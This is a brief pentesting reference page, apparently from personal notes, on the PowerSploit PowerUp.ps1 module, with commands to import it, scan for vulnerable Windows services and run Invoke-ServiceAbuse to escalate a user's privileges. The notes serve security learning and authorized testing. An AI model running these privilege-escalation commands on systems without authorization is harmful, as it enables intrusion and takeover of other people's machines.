---
title: PowerUp
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - windows
  - privilege
  - escalation
  - tools
---
# PowerUp.ps1

Run from powershell.


## Installation

Download from PowerSploit Github repo: [https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit).

```ps
Import-Module .\PowerUp.ps1
```


## Basic commands

```ps
# Find services vulnerables in my machine
Invoke-AllChecks

# Exploit a vulnerable service to escalate to the more privilege user that runs that service
Invoke-ServiceAbuse -Name ‘<NAME OF THE SERVICE>’ -UserName ‘<DOMAIN CONTROLLER>\<MY CURRENT USERNAME>’
```